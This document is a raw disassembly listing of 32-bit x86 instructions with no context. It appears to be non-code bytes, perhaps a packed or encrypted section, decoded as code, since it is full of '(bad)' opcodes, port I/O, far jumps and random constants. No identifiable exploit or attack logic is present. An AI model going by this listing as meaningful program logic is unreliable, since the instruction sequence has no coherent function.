  4146c9:	int    0xab
  4146cb:	jp     0x414745
  4146cd:	sbb    bl,bl
  4146cf:	je     0x4146ef
  4146d1:	add    eax,0xe6da89e1
  4146d6:	into   
  4146d7:	inc    ebx
  4146d8:	ss dec ebp
  4146da:	jae    0x414675
  4146dc:	into   
  4146dd:	mov    esp,0x4da4c022
  4146e2:	adc    eax,0xf0c5c629
  4146e7:	scas   eax,DWORD PTR es:[edi]
  4146e8:	adc    BYTE PTR [ebx+0x57],ch
  4146eb:	js     0x4146b2
  4146ed:	add    eax,0x993ff6d2
  4146f2:	out    dx,eax
  4146f3:	mov    cl,0xbc
  4146f5:	cmp    al,0x53
  4146f7:	mov    al,BYTE PTR [ebp+0x34]
  4146fa:	dec    ecx
  4146fb:	cdq    
  4146fc:	xchg   esp,eax
  4146fd:	data16 cmc 
  4146ff:	dec    ebx
  414700:	push   esp
  414701:	ret    0xd312
  414704:	popa   
  414705:	push   ds
  414706:	pusha  
  414707:	and    dl,BYTE PTR [ebp+0x79]
  41470a:	xchg   ch,dh
  41470c:	test   ebx,ecx
  41470e:	mov    BYTE PTR [ecx-0x38],ah
  414711:	and    DWORD PTR [edi],esp
  414713:	pop    ecx
  414714:	mov    dl,0x38
  414716:	jle    0x4146c1
  414718:	xchg   esi,eax
  414719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41471a:	mov    esp,0x7d262e6a
  41471f:	inc    ebp
  414720:	mov    ecx,esi
  414722:	sub    BYTE PTR [eax-0x1a],ch
  414725:	pop    ss
  414726:	add    cl,BYTE PTR [edx+eax*1]
  414729:	leave  
  41472a:	or     DWORD PTR [eax-0x72cc4d9b],edx
  414730:	inc    edx
  414731:	mov    ebx,ebx
  414733:	xchg   DWORD PTR [edx+0x5252e1a5],edx
  414739:	ins    DWORD PTR es:[edi],dx
  41473a:	call   0x6e6e:0xb401be74
  414741:	and    eax,0x909fd0e8
  414746:	retf   0xd7e6
  414749:	stos   BYTE PTR es:[edi],al
  41474a:	dec    ebp
  41474b:	mov    ds:0x53b017c7,al
  414750:	(bad)  
  414752:	jp     0x41470d
  414754:	adc    al,0x6c
  414756:	xor    al,0x83
  414758:	and    dl,al
  41475a:	mov    esi,0x63bb3748
  41475f:	push   ecx
  414760:	ret    0x2847
  414763:	scas   eax,DWORD PTR es:[edi]
  414764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414765:	bound  esi,QWORD PTR [edx+0x17]
  414768:	mov    ebp,0x26b42232
  41476d:	sub    ebx,DWORD PTR fs:[ecx+0x51]
  414771:	aad    0xe5
  414773:	xchg   esp,eax
  414774:	cmc    
  414775:	dec    edx
  414776:	mov    ebx,0x997d9a0
  41477b:	(bad)  
  41477c:	jmp    0x4147d2
  41477e:	xor    dh,dh
  414780:	int    0xc2
  414782:	mov    esp,0x305ea267
  414787:	xor    eax,0x370ed5df
  41478c:	outs   dx,BYTE PTR ds:[esi]
  41478d:	mov    ch,BYTE PTR [edx+0x2d]
  414790:	rcl    DWORD PTR [edi-0x21],0xa
  414794:	sti    
  414795:	sahf   
  414796:	jmp    0x898c:0xdc0e0a1c
  41479d:	or     eax,DWORD PTR [ebx+0x26322a23]
  4147a3:	mov    ds:0xa1e68283,eax
  4147a8:	jb     0x4147c2
  4147aa:	xchg   esp,eax
  4147ab:	and    DWORD PTR [edx],edx
  4147ad:	hlt    
  4147ae:	(bad)  [ecx-0x1e]
  4147b1:	inc    DWORD PTR [ebp-0x79]
  4147b4:	and    BYTE PTR [edi],0xab
  4147b7:	push   0xffffffaf
  4147b9:	mov    ds:0xd6443772,al
  4147be:	jp     0x4147aa
  4147c0:	xor    edx,0x5a5d0436
  4147c6:	cwde   
  4147c7:	mov    eax,ds:0x2e150b61
  4147cc:	retf   0x9f34
  4147cf:	xchg   ebp,eax
  4147d0:	or     DWORD PTR [ebx],ebx
  4147d2:	iret   
  4147d3:	mov    cl,0xbb
  4147d5:	mov    ebp,0x51964f7f
  4147da:	in     al,dx
  4147db:	out    dx,eax
  4147dc:	fcom   QWORD PTR [ebx]
  4147de:	push   ss
  4147df:	mov    al,0x35
  4147e1:	pop    ebp
  4147e2:	mov    ebx,0x75d3357c
  4147e7:	lods   al,BYTE PTR cs:[esi]
  4147e9:	bound  ecx,QWORD PTR [esi-0x204c0a6c]
  4147ef:	and    BYTE PTR [edx-0x41f84903],0xea
  4147f6:	push   cs
  4147f7:	cld    
  4147f8:	xrelease mov DWORD PTR [bx+si+0x5069],esi
  4147fe:	and    ah,BYTE PTR [esi]
  414800:	das    
  414801:	icebp  
  414802:	aaa    
  414803:	add    WORD PTR [edx+0x2fc432d7],di
  41480a:	sar    DWORD PTR [esp+ecx*1+0x38],0xdc
  41480f:	add    DWORD PTR [ebx+edx*8],eax
  414812:	ja     0x4147fc
  414814:	int    0x93
  414816:	fisubr WORD PTR [esi-0x3466170e]
  41481c:	sub    bh,dl
  41481e:	(bad)  
  41481f:	push   edx
  414820:	fldcw  WORD PTR [eax+0x210f7cb]
  414826:	sub    edx,DWORD PTR [esi]
  414828:	(bad)  
  41482a:	xor    eax,0xed228829
  41482f:	sub    cl,ah
  414831:	cmp    al,BYTE PTR ds:0xac5d3cb7
  414837:	aaa    
  414838:	sub    BYTE PTR [edx+0x161dea42],ch
  41483e:	push   es
  41483f:	ss cmp eax,0x457b6653
  414845:	fstp   DWORD PTR [edi]
  414847:	pop    ss
  414848:	jg     0x414824
  41484a:	and    esp,DWORD PTR [ecx]
  41484c:	xlat   BYTE PTR ds:[ebx]
  41484d:	push   edi
  41484e:	sub    DWORD PTR [esp+ecx*8+0x1970f092],ebx
  414855:	mov    ds:0xcd70022c,eax
  41485a:	adc    DWORD PTR [esi+edx*1-0x7],ebx
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   ss
  414860:	xchg   esi,eax
  414861:	dec    ebx
  414862:	pop    ecx
  414863:	push   esp
  414864:	or     DWORD PTR [esi],ebx
  414866:	pop    eax
  414867:	mov    dh,0xa8
  414869:	lods   eax,DWORD PTR ds:[esi]
  41486a:	dec    edi
  41486b:	pop    es
  41486c:	add    DWORD PTR [ecx-0x8],edx
  41486f:	adc    al,0x34
  414871:	dec    ebp
  414872:	xor    bl,dl
  414874:	dec    esi
  414875:	int3   
  414876:	test   BYTE PTR [eax+eax*8],dh
  414879:	xor    edx,DWORD PTR [edx+eax*8-0x124734ce]
  414880:	mov    dl,0x26
  414882:	jge    0x414865
  414884:	(bad)  
  414885:	cmp    al,0x8d
  414887:	retf   
  414888:	pop    ebp
  414889:	mov    al,ds:0x9ceafb44
  41488e:	jae    0x41487e
  414890:	shr    BYTE PTR [edi],1
  414892:	cwde   
  414893:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414895:	jp     0x41482b
  414897:	add    esi,edx
  414899:	xchg   DWORD PTR [eax+esi*4+0x18],edi
  41489d:	(bad)  
  41489e:	jl     0x414908
  4148a0:	or     DWORD PTR [edx+0x2c842dec],edx
  4148a6:	das    
  4148a7:	(bad)  
  4148a8:	cmp    BYTE PTR gs:[ecx],dh
  4148ab:	fidivr WORD PTR [esp+ebp*2-0x64790c70]
  4148b2:	jecxz  0x414867
  4148b4:	jp     0x414842
  4148b6:	cld    
  4148b7:	fisttp QWORD PTR [ecx-0x47385dbf]
  4148bd:	pop    ebp
  4148be:	dec    esi
  4148bf:	out    dx,eax
  4148c0:	call   0xcf22fa1
  4148c5:	loopne 0x414861
  4148c7:	sbb    eax,0x859a363f
  4148cc:	jmp    FWORD PTR ds:0x1c373a4
  4148d2:	in     al,0xba
  4148d4:	fld    DWORD PTR [eax-0x11]
  4148d7:	je     0x414919
  4148d9:	adc    al,0x9a
  4148db:	ds mov bh,0x91
  4148de:	and    DWORD PTR [ebx-0x2f84cf9f],0xffffffa0
  4148e5:	sub    al,0xc1
  4148e7:	cdq    
  4148e8:	jmp    0x41493c
  4148ea:	xchg   esp,edi
  4148ec:	arpl   WORD PTR [ebp-0x1166532],ax
  4148f2:	and    bl,BYTE PTR [esi-0x39]
  4148f5:	or     eax,0xef944f94
  4148fa:	cmc    
  4148fb:	test   BYTE PTR [edi+0x1],al
  4148fe:	stos   BYTE PTR es:[edi],al
  4148ff:	int3   
  414900:	call   0x2563:0xb352f28d
  414907:	call   0xe05f:0x61ffd079
  41490e:	(bad)  
  41490f:	mov    eax,ds:0x3d7baef9
  414914:	dec    esi
  414915:	mov    ecx,0x6edcdad2
  41491a:	loopne 0x4148d3
  41491c:	xor    BYTE PTR [ebp+0x6c47340b],al
  414922:	lds    esi,FWORD PTR [esi+0x51]
  414925:	xlat   BYTE PTR ds:[ebx]
  414926:	sub    DWORD PTR [edi-0x1c],esp
  414929:	(bad)  
  41492a:	cld    
  41492b:	mov    bl,0xf8
  41492d:	xor    ch,dl
  41492f:	jbe    0x414931
  414931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414932:	mov    dh,0x6
  414934:	call   0xca26:0x9ff2a30d
  41493b:	jecxz  0x414986
  41493d:	gs push 0xce1d5bce
  414943:	test   bh,ch
  414945:	cmp    cl,BYTE PTR [ebp-0x36]
  414948:	test   al,0x49
  41494a:	pop    esp
  41494b:	cmp    DWORD PTR [eax-0x217b5ef],eax
  414951:	cwde   
  414952:	mov    al,ds:0xfe721a30
  414957:	pushf  
  414958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414959:	sbb    ecx,DWORD PTR [ebp+0x2e]
  41495c:	scas   eax,DWORD PTR es:[edi]
  41495d:	push   eax
  41495e:	fistp  DWORD PTR [si-0x2]
  414962:	sbb    ah,ch
  414964:	mov    ah,0xcc
  414966:	pushf  
  414967:	mov    cl,0x83
  414969:	or     eax,0xe7e27215
  41496e:	leave  
  41496f:	jo     0x414973
  414971:	or     BYTE PTR [edi+0x6cfdfafd],0x91
  414978:	(bad)  
  414979:	jp     0x4149ce
  41497b:	add    ebx,ecx
  41497d:	mov    ah,0x70
  41497f:	outs   dx,DWORD PTR ds:[esi]
  414980:	cmp    ebp,ebp
  414982:	jnp    0x414942
  414984:	push   ecx
  414985:	jae    0x4149fe
  414987:	jl     0x414989
  414989:	js     0x4149cf
  41498b:	cdq    
  41498c:	and    esp,ecx
  41498e:	in     al,0xa9
  414990:	cmp    cl,bl
  414992:	xchg   ecx,eax
  414993:	ins    BYTE PTR es:[edi],dx
  414994:	fcom   st(6)
  414996:	ret    
  414997:	jb     0x414a03
  414999:	sub    ah,BYTE PTR [edx]
  41499b:	popf   
  41499c:	mov    ch,0xe0
  41499e:	and    ecx,esp
  4149a0:	cmp    ebp,0x30
  4149a3:	out    0xb6,al
  4149a5:	mov    WORD PTR [esi-0x3b],fs
  4149a8:	xchg   esp,eax
  4149a9:	dec    ecx
  4149aa:	fdivr  st,st(3)
  4149ac:	clc    
  4149ad:	int    0x91
  4149af:	push   es
  4149b0:	push   cs
  4149b1:	push   0xde9575
  4149b6:	push   edx
  4149b7:	das    
  4149b8:	aad    0x25
  4149ba:	dec    eax
  4149bb:	call   0x7e6d:0x9d000c8a
  4149c2:	sub    esi,DWORD PTR [esi-0x5b]
  4149c5:	push   0x4dd96264
  4149ca:	in     eax,dx
  4149cb:	adc    dh,BYTE PTR [eax]
  4149cd:	jae    0x4149d1
  4149cf:	inc    esp
  4149d0:	pop    ebp
  4149d1:	jmp    0xae477916
  4149d6:	imul   edx,esp,0x68230e44
  4149dc:	ins    DWORD PTR es:[edi],dx
  4149dd:	mov    dh,0xa8
  4149df:	call   0x4eccae83
  4149e4:	mov    eax,ds:0x6e8e5da2
  4149e9:	(bad)  
  4149ea:	call   0x391825d7
  4149ef:	adc    ecx,eax
  4149f1:	jecxz  0x4149bb
  4149f3:	ret    
  4149f4:	scas   al,BYTE PTR es:[edi]
  4149f5:	or     DWORD PTR [ecx-0x14],edx
  4149f8:	leave  
  4149f9:	inc    ebp
  4149fa:	aaa    
  4149fb:	dec    esp
  4149fc:	push   ecx
  4149fd:	ds aam 0x0
  414a00:	push   ds
  414a01:	adc    ch,BYTE PTR [esi-0x3f342efe]
  414a07:	adc    al,0x7a
  414a09:	(bad)  
  414a0b:	sbb    esp,DWORD PTR ds:0x463de2b5
  414a11:	shl    BYTE PTR [eax-0x1343786c],0xa8
  414a18:	cmc    
  414a19:	inc    edx
  414a1a:	je     0x414a05
  414a1c:	shr    esi,0xff
  414a1f:	add    ch,BYTE PTR [esi-0x10908169]
  414a25:	retf   0xcb8b
  414a28:	or     bh,ch
  414a2a:	jecxz  0x4149eb
  414a2c:	rcl    BYTE PTR [ebx],1
  414a2e:	pop    ecx
  414a2f:	dec    eax
  414a30:	cmp    DWORD PTR [ecx+0x14],esp
  414a33:	mov    bl,0x43
  414a35:	fs call 0xd04aa2ed
  414a3b:	mov    ebp,0x5db1f775
  414a40:	sub    ecx,0x86cfe0a9
  414a46:	sbb    bl,BYTE PTR ds:0x96bd4756
  414a4c:	scas   eax,DWORD PTR es:[edi]
  414a4d:	mov    BYTE PTR [ecx-0x515bc1ff],ch
  414a53:	mov    DWORD PTR [esi+0x60],edi
  414a56:	xchg   ebp,eax
  414a57:	ins    DWORD PTR es:[edi],dx
  414a58:	lock xchg esi,eax
  414a5a:	mov    DWORD PTR [esi],esp
  414a5c:	sbb    al,0xaa
  414a5e:	sbb    DWORD PTR ds:0x5f876a1b,edi
  414a64:	loopne 0x414a98
  414a66:	mov    esi,0xbb44de22
  414a6b:	xchg   BYTE PTR [edi-0x58],cl
  414a6e:	loop   0x414a87
  414a70:	sti    
  414a71:	and    al,0x16
  414a73:	ja     0x414abb
  414a75:	shr    DWORD PTR [ebp+0x16],0x67
  414a79:	mov    ebp,0x2f5badde
  414a7e:	inc    ecx
  414a7f:	or     al,0x3f
  414a81:	mul    DWORD PTR [ebp+0x24]
  414a84:	scas   al,BYTE PTR es:[edi]
  414a85:	and    BYTE PTR [edx],ch
  414a87:	stos   DWORD PTR es:[edi],eax
  414a88:	mov    ds:0xdf0b71b,eax
  414a8d:	jb     0x414a8a
  414a8f:	cli    
  414a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a91:	and    BYTE PTR [edx+0x40],dl
  414a94:	xor    al,0x19
  414a96:	ins    BYTE PTR es:[edi],dx
  414a97:	cmp    al,0xfe
  414a99:	fild   QWORD PTR [ecx-0x7777ac70]
  414a9f:	pop    ss
  414aa0:	mov    al,ds:0x1bbb6a7d
  414aa5:	hlt    
  414aa6:	out    0x23,al
  414aa8:	les    ebp,FWORD PTR [edi]
  414aaa:	pop    ss
  414aab:	and    DWORD PTR [eax+ebx*1],esi
  414aae:	add    eax,0x3208bae9
  414ab3:	mov    WORD PTR [ebx],cs
  414ab5:	mov    ebp,0xf1cf1d1f
  414aba:	test   al,0xf4
  414abc:	ins    WORD PTR es:[edi],dx
  414abe:	cwde   
  414abf:	pop    ds
  414ac0:	or     BYTE PTR [ebx],ch
  414ac2:	sub    DWORD PTR [ebp+0x2d],edi
  414ac5:	mov    BYTE PTR [ebx-0x7],dl
  414ac8:	jns    0x414b1f
  414aca:	or     bl,bl
  414acc:	ja     0x414a8c
  414ace:	fidiv  WORD PTR [edx-0x3ddcc0e6]
  414ad4:	ins    DWORD PTR es:[edi],dx
  414ad5:	jle    0x414aa3
  414ad7:	fwait
  414ad8:	jo     0x414b4e
  414ada:	shr    DWORD PTR [edx],0xe9
  414add:	vorps  xmm4,xmm2,XMMWORD PTR [edi]
  414ae1:	mov    ah,0xc1
  414ae3:	stos   DWORD PTR es:[edi],eax
  414ae4:	mov    bh,0x52
  414ae6:	jno    0x414b62
  414ae8:	mov    cs,WORD PTR [eax+0x23]
  414aeb:	fdivr  QWORD PTR [eax]
  414aed:	push   edx
  414aee:	in     eax,dx
  414aef:	mov    ds:0xf9805e00,al
  414af4:	call   0xfe39:0xd53c6263
  414afb:	out    dx,eax
  414afc:	mov    eax,ds:0xf648beb4
  414b01:	add    BYTE PTR [edi],bh
  414b03:	pop    ebp
  414b04:	repz xchg ebx,eax
  414b06:	sbb    edi,DWORD PTR [edx-0x29]
  414b09:	mov    ebp,0x801838c0
  414b0e:	mov    ebp,0x62531a7d
  414b13:	je     0x414b2a
  414b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b16:	pop    esp
  414b17:	test   DWORD PTR [edx],0x69b4dec8
  414b1d:	cs pop edi
  414b1f:	jmp    0x138b6bc2
  414b24:	mov    al,ds:0x68d3635b
  414b29:	xor    eax,0x51519fe2
  414b2e:	mov    eax,0x13c0b062
  414b33:	out    dx,al
  414b34:	push   0x2ea29296
  414b39:	cwde   
  414b3a:	mov    bh,0x34
  414b3c:	push   es
  414b3d:	cwde   
  414b3e:	pusha  
  414b3f:	add    edi,esp
  414b41:	ss sbb al,0x33
  414b44:	jecxz  0x414b83
  414b46:	mov    eax,DWORD PTR [eax-0x7269167b]
  414b4c:	and    dh,BYTE PTR [ebx]
  414b4e:	mov    bh,0xc0
  414b50:	sbb    al,0xe
  414b52:	rcl    BYTE PTR [ebx],0xd4
  414b55:	scas   eax,DWORD PTR es:[edi]
  414b56:	aam    0x1a
  414b58:	jne    0x414b22
  414b5a:	xchg   esp,eax
  414b5b:	adc    DWORD PTR [esi-0x49caa6e1],edx
  414b61:	push   ebx
  414b62:	stos   BYTE PTR es:[edi],al
  414b63:	pop    edi
  414b64:	adc    eax,0x5f62cc67
  414b69:	push   0x31395cc8
  414b6e:	lods   eax,DWORD PTR ds:[esi]
  414b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b70:	mov    dh,al
  414b72:	in     eax,dx
  414b73:	or     al,0xbc
  414b75:	jecxz  0x414b02
  414b77:	jge    0x414b50
  414b79:	add    DWORD PTR [ebx-0x2620c3da],esp
  414b7f:	mov    ebx,ebx
  414b81:	sub    edx,DWORD PTR [edi]
  414b83:	in     eax,0x85
  414b85:	fmul   QWORD PTR [eax]
  414b87:	test   eax,0x55bd8cb4
  414b8c:	scas   al,BYTE PTR es:[edi]
  414b8d:	push   0x23
  414b8f:	mov    WORD PTR ds:0x455b800a,?
  414b95:	loope  0x414b29
  414b97:	lahf   
  414b98:	adc    esi,DWORD PTR [edx+0x1e]
  414b9b:	out    dx,eax
  414b9c:	mov    dl,0x72
  414b9e:	retf   0x8788
  414ba1:	sbb    eax,0x7ff461ac
  414ba6:	popa   
  414ba7:	jbe    0x414bc5
  414ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414baa:	stos   DWORD PTR es:[edi],eax
  414bab:	jmp    0x414b7c
  414bad:	xchg   esi,eax
  414bae:	dec    esp
  414baf:	mov    dl,0xc2
  414bb1:	or     esi,0xffffffb9
  414bb4:	shl    BYTE PTR [ecx+0x39658378],cl
  414bba:	ret    
  414bbb:	xor    al,0xd
  414bbd:	push   eax
  414bbe:	lods   eax,DWORD PTR ds:[esi]
  414bbf:	fsub   QWORD PTR [eax+0x2ffaf23]
  414bc5:	aad    0xe8
  414bc7:	cmp    esi,DWORD PTR [ebx+0x65528479]
  414bcd:	jae    0x414bf4
  414bcf:	stos   BYTE PTR es:[edi],al
  414bd0:	mov    DWORD PTR [ebx+ecx*4+0x5cdf768c],0xfaa0c6d5
  414bdb:	scas   al,BYTE PTR es:[edi]
  414bdc:	call   0x9d48:0x840d07ad
  414be3:	ins    DWORD PTR es:[edi],dx
  414be4:	pop    es
  414be5:	inc    ebx
  414be6:	stos   BYTE PTR es:[edi],al
  414be7:	mov    edx,0xd2102074
  414bec:	loope  0x414c35
  414bee:	xchg   ebp,eax
  414bef:	in     eax,0xd
  414bf1:	fwait
  414bf2:	hlt    
  414bf3:	xchg   DWORD PTR ss:[edx],edx
  414bf6:	push   ecx
  414bf7:	fidiv  WORD PTR [ebp+0x7f1dd2ee]
  414bfd:	outs   dx,BYTE PTR ds:[esi]
  414bfe:	and    DWORD PTR [edi+0x5c4c3d54],edi
  414c04:	cdq    
  414c05:	aas    
  414c06:	add    dh,BYTE PTR [esi-0x2adc6907]
  414c0c:	and    al,0xf6
  414c0e:	sar    BYTE PTR ds:0x46f6d671,cl
  414c14:	push   ds
  414c15:	mov    ebx,0xe9d6fea5
  414c1a:	dec    ebx
  414c1b:	xor    esi,DWORD PTR [ebp+0x2d588115]
  414c21:	jmp    0x3781:0x8e7bc6e8
  414c28:	pop    edi
  414c29:	imul   eax,DWORD PTR [edi],0x1764726d
  414c2f:	jge    0x414bdb
  414c31:	or     edx,edx
  414c33:	xor    dl,dl
  414c35:	popf   
  414c36:	imul   eax,DWORD PTR [edi],0x651e848e
  414c3c:	cmp    al,0xa2
  414c3e:	lods   eax,DWORD PTR ds:[esi]
  414c3f:	add    DWORD PTR [ebp-0x2085cad3],esp
  414c45:	popa   
  414c46:	mov    eax,ds:0x3d8f991
  414c4b:	xchg   BYTE PTR [esi-0x1d],cl
  414c4e:	sbb    eax,0xa740952c
  414c53:	es retf 0xb347
  414c57:	aam    0x43
  414c59:	adc    eax,0xa40fba33
  414c5e:	test   DWORD PTR [edi-0x614d681c],esp
  414c64:	or     al,BYTE PTR [edi-0x568f74af]
  414c6a:	cdq    
  414c6b:	pop    ecx
  414c6c:	rcl    BYTE PTR [edi],cl
  414c6e:	inc    ecx
  414c6f:	addr16 push esp
  414c71:	mov    dl,0x42
  414c73:	mov    eax,0xa9c39b8
  414c78:	push   ebx
  414c79:	leave  
  414c7a:	sbb    eax,0xca23fa65
  414c7f:	push   esp
  414c80:	xor    eax,0x79b294f1
  414c85:	inc    esi
  414c86:	pop    edi
  414c87:	mov    bh,0x9f
  414c89:	lods   al,BYTE PTR ds:[esi]
  414c8a:	int3   
  414c8b:	getsec 
  414c8d:	and    ecx,DWORD PTR [ecx]
  414c8f:	sub    al,0xb9
  414c91:	ror    DWORD PTR [ebp+edi*2-0x678ef97a],cl
  414c98:	jg     0x414cf5
  414c9a:	js     0x414c30
  414c9c:	adc    BYTE PTR [esi-0x76],0x8f
  414ca0:	dec    edi
  414ca1:	stos   BYTE PTR es:[edi],al
  414ca2:	mov    ch,0xa4
  414ca4:	shl    ecx,1
  414ca6:	imul   esp,DWORD PTR [ebx+0x2e],0xffffff89
  414caa:	cs test eax,0x73571689
  414cb0:	sub    ebx,ebx
  414cb2:	cmp    DWORD PTR [edx+0x60],edi
  414cb5:	or     al,0xdf
  414cb7:	inc    eax
  414cb8:	out    0x34,al
  414cba:	mov    ah,0x81
  414cbc:	ds dec esi
  414cbe:	dec    ebp
  414cbf:	scas   al,BYTE PTR es:[edi]
  414cc0:	not    BYTE PTR [eax-0x21]
  414cc3:	mov    DWORD PTR [esi],ebx
  414cc5:	xlat   BYTE PTR ds:[ebx]
  414cc6:	iret   
  414cc7:	lock mov ecx,0xf57e7890
  414ccd:	mov    bh,0x19
  414ccf:	(bad)  
  414cd1:	int3   
  414cd2:	dec    ebx
  414cd3:	ficomp WORD PTR [edi]
  414cd5:	icebp  
  414cd6:	or     edi,DWORD PTR ds:0x32dc61a2
  414cdc:	stos   DWORD PTR es:[edi],eax
  414cdd:	daa    
  414cde:	test   al,0x7b
  414ce0:	arpl   WORD PTR [ecx+0x3e441221],bx
  414ce6:	out    dx,al
  414ce7:	dec    esi
  414ce8:	cmp    bl,BYTE PTR [edi-0x67d7ef08]
  414cee:	adc    eax,0xa211e83e
  414cf3:	or     bl,dl
  414cf5:	mov    cl,0x33
  414cf7:	lahf   
  414cf8:	std    
  414cf9:	in     eax,dx
  414cfa:	daa    
  414cfb:	or     BYTE PTR [ecx+0x13],cl
  414cfe:	(bad)  
  414cff:	ja     0x414d38
  414d01:	int    0x29
  414d03:	mov    ecx,0xb93f2e8b
  414d08:	fsubp  st(1),st
  414d0a:	icebp  
  414d0b:	mov    bh,BYTE PTR [eax+0x5]
  414d0e:	lea    eax,[edx+0x10]
  414d11:	pop    edx
  414d12:	sahf   
  414d13:	inc    edx
  414d14:	mov    ch,0x4f
  414d16:	sahf   
  414d17:	in     al,dx
  414d18:	cld    
  414d19:	call   0xe445:0x8f1eacb1
  414d20:	adc    DWORD PTR [eax+eax*4-0x15],ebp
  414d24:	popf   
  414d25:	retf   0xbdd7
  414d28:	fmul   QWORD PTR [ebp+eax*1-0x11bc1f0a]
  414d2f:	pop    edi
  414d30:	(bad)  
  414d32:	mov    eax,ds:0x89452bd2
  414d37:	jecxz  0x414da8
  414d39:	ins    DWORD PTR es:[edi],dx
  414d3a:	push   0x5744210b
  414d3f:	dec    edi
  414d40:	xlat   BYTE PTR ds:[ebx]
  414d41:	loop   0x414d40
  414d43:	or     BYTE PTR [esp+esi*8-0x22f2787e],dh
  414d4a:	aas    
  414d4b:	add    BYTE PTR [eax-0x1c8f9a16],al
  414d51:	jmp    0x7916:0x58b36e0c
  414d58:	jb     0x414cdc
  414d5a:	fdivr  QWORD PTR [esi+0x4a]
  414d5d:	iret   
  414d5e:	or     esi,DWORD PTR [ebp+0x14]
  414d61:	jbe    0x414d5c
  414d63:	je     0x414d95
  414d65:	mov    cl,BYTE PTR [edx-0x59a1ab7c]
  414d6b:	pop    ds
  414d6c:	cdq    
  414d6d:	dec    edi
  414d6e:	pop    edi
  414d6f:	(bad)  
  414d70:	pop    ds
  414d71:	push   cs
  414d72:	out    0x96,al
  414d74:	mov    al,ds:0x242e78f6
  414d79:	pop    esi
  414d7a:	pop    ds
  414d7b:	push   cs
  414d7c:	fidivr DWORD PTR [ebx]
  414d7e:	and    eax,0x2ddc0e5b
  414d83:	cmp    DWORD PTR [ebx-0x2718273a],eax
  414d89:	sbb    al,0x56
  414d8b:	outs   dx,BYTE PTR ds:[esi]
  414d8c:	mov    ch,0xca
  414d8e:	jle    0x414da6
  414d90:	xchg   ebx,eax
  414d91:	mov    edi,0xd2ee44f7
  414d96:	fcom   DWORD PTR [esi]
  414d98:	mov    al,0x2e
  414d9a:	or     al,0x3
  414d9c:	mov    ebp,0xa37db607
  414da1:	and    al,0xd9
  414da3:	scas   al,BYTE PTR es:[edi]
  414da4:	xor    dh,ch
  414da6:	les    eax,FWORD PTR [ebx]
  414da8:	les    esp,FWORD PTR [ecx]
  414daa:	cmp    eax,DWORD PTR [ebp-0x7d]
  414dad:	sub    DWORD PTR [ebx],eax
  414daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db0:	dec    eax
  414db1:	or     al,cl
  414db3:	xchg   edx,esp
  414db5:	clc    
  414db6:	jl     0x414e00
  414db8:	setbe  ah
  414dbb:	fistp  DWORD PTR [ebx+edx*2+0x4ba5644c]
  414dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dc3:	jp     0x414e1e
  414dc5:	(bad)  
  414dc6:	mov    esp,DWORD PTR [ebp+eax*1-0x7bfafb7a]
  414dcd:	sub    DWORD PTR [edx+0x62e98221],ebp
  414dd3:	mov    ebx,0x206ed13
  414dd8:	scas   eax,DWORD PTR es:[edi]
  414dd9:	cmp    ch,BYTE PTR [ebx-0x4e2af3c1]
  414ddf:	pop    es
  414de0:	lds    ecx,FWORD PTR [esp+ecx*1]
  414de3:	sub    ah,dl
  414de5:	cmp    DWORD PTR [ebx],ebp
  414de7:	mov    al,ds:0x5970e694
  414dec:	xchg   edx,ecx
  414dee:	mov    ecx,0xab75a6e9
  414df3:	scas   eax,DWORD PTR es:[edi]
  414df4:	mov    ds:0x3de2290a,al
  414df9:	shr    BYTE PTR [ebx+0x16],0xb5
  414dfd:	sti    
  414dfe:	aaa    
  414dff:	push   ebp
  414e00:	enter  0xb2fe,0xae
  414e04:	pop    ebx
  414e05:	xchg   edi,eax
  414e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e07:	in     al,0xd
  414e09:	inc    eax
  414e0a:	add    bl,bh
  414e0c:	jbe    0x414dc0
  414e0e:	jecxz  0x414e6e
  414e10:	out    dx,al
  414e11:	push   es
  414e12:	test   esp,0xc4417027
  414e18:	ret    
  414e19:	ins    BYTE PTR es:[edi],dx
  414e1a:	push   esi
  414e1b:	les    ebx,FWORD PTR [edi]
  414e1d:	add    al,0x11
  414e1f:	add    BYTE PTR [ecx+ebx*8+0x7d],ch
  414e23:	ins    DWORD PTR es:[edi],dx
  414e24:	adc    edx,0xffffffda
  414e27:	stc    
  414e28:	mov    edi,0xfb78ccae
  414e2d:	xchg   ebx,eax
  414e2e:	xor    al,0x7f
  414e30:	mov    bh,0x7a
  414e32:	(bad)  
  414e33:	adc    eax,0x6c70ee55
  414e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e39:	int    0xa
  414e3b:	add    eax,0xc4791295
  414e40:	jmp    0x414e7c
  414e42:	mov    cs,WORD PTR [ebp+0x4f]
  414e45:	stos   DWORD PTR es:[edi],eax
  414e46:	mov    ebp,0xbbe5f658
  414e4b:	fst    DWORD PTR [ebp+0x26]
  414e4e:	pop    ds
  414e4f:	(bad)  
  414e50:	shl    DWORD PTR [ecx],0xf1
  414e53:	pop    eax
  414e54:	inc    ebp
  414e55:	sbb    al,0x7d
  414e57:	or     DWORD PTR [edi],edi
  414e59:	pop    ebp
  414e5a:	cmp    DWORD PTR [esi+eiz*2],edi
  414e5d:	inc    ebp
  414e5e:	mov    BYTE PTR [edi+0x75],dl
  414e61:	(bad)  
  414e62:	lea    edi,[esi-0x51]
  414e65:	push   esi
  414e66:	jo     0x414eb7
  414e68:	rcr    DWORD PTR [esi+0x21d55e26],0x6a
  414e6f:	repnz fsincos 
  414e72:	and    al,0x67
  414e74:	cmp    eax,0xdda49f54
  414e79:	fiadd  WORD PTR [eax-0x2]
  414e7c:	add    al,0xc
  414e7e:	or     dh,BYTE PTR [edx-0x2d]
  414e81:	push   cs
  414e82:	mov    ds:0xd4f77a8f,eax
  414e87:	(bad)  
